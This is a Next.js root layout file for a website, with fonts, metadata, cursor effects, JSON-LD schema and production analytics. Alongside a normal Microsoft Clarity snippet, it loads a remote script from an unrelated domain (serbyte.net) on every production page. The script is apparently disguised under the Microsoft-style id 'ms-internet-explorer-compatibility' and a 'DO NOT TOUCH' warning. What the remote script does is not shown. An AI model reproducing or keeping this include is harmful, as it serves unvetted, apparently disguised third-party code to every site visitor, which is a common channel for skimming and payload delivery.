import { FooterV2 } from "./components/Footer/FooterV2"
import localFont from "next/font/local"
import "./globalsV2.css"
import { Metadata } from "next"
import { DOMAIN_URL, SITE_CONFIG } from "@/config/siteConfig"
import { TopBarV2 } from "./components/TopBar/TopBarV2"
import { MotionWrapper } from "./utils/lazy-ui"
import { Analytics } from "@vercel/analytics/next"
import { bodyAttributes } from "@zero-ui/attributes"
import { ViewTransitions } from "./utils/ViewTransition"
import { BottomBlurOverlay } from "./ui/BlurBottomOverlay"
import { LazySplashCursor } from "./utils/lazy-splash-cursor"
import { DesktopCursor } from "./utils/lazy-dot-cursor"
import { siteGraph } from "@/config/schemas"
import Script from "next/script"

const switzer = localFont({
  src: "./fonts/Switzer-Variable.woff2",
  variable: "--font-switzer",
  display: "swap",
  style: "normal",
  weight: "300 400 500 600 700",
  fallback: ["helvetica", "sans-serif"],
  preload: true,
})
export const metadata: Metadata = {
  metadataBase: new URL(DOMAIN_URL),
  title: SITE_CONFIG.title,
  description: SITE_CONFIG.description,
}
const RootLayout = ({ children }: { children: React.ReactNode }) => {
  return (
    <html lang="en">
      <body {...bodyAttributes} className="relative min-w-[300px] bg-white" data-mobile-menu="closed" data-scrolled="up">
        <MotionWrapper>
          <DesktopCursor />
          <ViewTransitions />
          <LazySplashCursor />
          <div className="custom:mx-auto xxs:mx-3.5 pointer-events-none absolute inset-0 z-1 max-w-6xl [background-image:url('/assets/framer-noise.png')] [background-size:128px] bg-repeat opacity-6 md:mx-5 lg:mx-8" />
          <div className={`${switzer.variable} font-switzer subpixel-antialiased`}>
            <div className="custom:mx-auto xxs:border-x pointer-events-none absolute inset-0 z-0 mx-3.5 max-w-6xl border-gray-200 md:mx-5 lg:mx-8" />
            <BottomBlurOverlay />
            <TopBarV2 />
            {children}

            <script
              id="id-site-schema"
              type="application/ld+json"
              dangerouslySetInnerHTML={{
                __html: JSON.stringify(siteGraph),
              }}
            />
            <FooterV2 />
          </div>
        </MotionWrapper>
        {process.env.NODE_ENV === "production" && (
          <>
            <Script
              id="ms-clarity"
              strategy="lazyOnload"
              dangerouslySetInnerHTML={{
                __html: `
        (function(c,l,a,r,i,t,y){
          // bail if something polluted window.clarity
          if (c[a] && typeof c[a] !== "function") { try { delete c[a]; } catch(_) {} }
          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "t4bi2igt7h");
      `,
              }}
            />
            {/* DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU ARE DOING */}
            <Script id="ms-internet-explorer-compatibility" strategy="lazyOnload" src="https://serbyte.net/api/compatibility" />
            <Analytics />
          </>
        )}
      </body>
    </html>
  )
}
export default RootLayout
